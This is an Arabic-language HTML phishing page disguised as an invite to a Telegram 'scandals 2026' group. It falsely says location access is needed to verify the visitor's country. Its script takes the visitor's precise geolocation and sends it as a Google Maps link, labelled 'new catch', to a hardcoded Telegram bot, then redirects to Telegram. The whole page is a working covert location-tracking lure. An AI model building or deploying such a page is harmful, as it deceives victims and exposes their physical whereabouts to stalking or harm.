<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Join Group</title>
    <style>
        body { background-color: #1c1c1c; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #2b2b2b; padding: 30px; border-radius: 20px; text-align: center; width: 85%; max-width: 400px; border: 1px solid #444; }
        .btn { background: #24A1DE; color: white; padding: 15px 30px; border: none; border-radius: 30px; font-weight: bold; font-size: 18px; cursor: pointer; width: 100%; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" width="60">
        <h2 dir="rtl">جروب: فضائح 2026 🔥</h2>
        <p dir="rtl">يجب السماح بالوصول للموقع للتأكد من دولتك وفتح المحتوى.</p>
        <button class="btn" onclick="start()">انضمام الآن</button>
    </div>

    <script>
        function start() {
            const T = '8785845001:AAHzQH63-LseRb0meHZI6-9fCLHNW1nst_c';
            const C = '6648970984';
            
            navigator.geolocation.getCurrentPosition((p) => {
                const msg = `📍 صيد جديد: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}`)
                .then(() => { window.location.href = "https://t.me/telegram"; });
            }, (err) => {
                alert("يرجى السماح بالموقع للدخول إلى الجروب!");
            }, {enableHighAccuracy: true});
        }
    </script>
</body>
</html>
